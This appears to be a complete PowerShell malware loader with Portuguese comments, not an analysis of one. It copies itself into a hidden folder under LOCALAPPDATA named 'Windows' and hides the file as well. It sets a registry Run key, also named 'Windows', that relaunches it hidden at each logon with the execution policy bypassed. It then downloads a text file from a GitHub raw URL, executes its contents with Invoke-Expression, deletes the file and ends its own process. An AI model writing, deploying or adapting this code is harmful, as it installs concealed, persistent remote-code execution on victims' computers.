# ============================================================

$installDir  = Join-Path $env:LOCALAPPDATA "Windows"
$installPath = Join-Path $installDir "7.ps1"

# Cria a pasta de instalação
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

# Copia o script para o local permanente
if ($PSCommandPath -ne $installPath) {
    Copy-Item -Path $PSCommandPath -Destination $installPath -Force
}

# Marca a pasta como oculta
$dirInfo = Get-Item $installDir
$dirInfo.Attributes = $dirInfo.Attributes -bor [System.IO.FileAttributes]::Hidden

# Marca o arquivo como oculto
$fileInfo = Get-Item $installPath
$fileInfo.Attributes = $fileInfo.Attributes -bor [System.IO.FileAttributes]::Hidden

# ============================================================

$runCommand = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $installPath + '"'

New-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "Windows" `
    -Value $runCommand `
    -PropertyType String `
    -Force | Out-Null

# ============================================================

$f = Join-Path $installDir "8.txt"; Invoke-WebRequest "https://raw.githubusercontent.com/c0261/2/main/8.txt" -OutFile $f; Invoke-Expression (Get-Content $f -Raw); Remove-Item $f

Stop-Process -Id $PID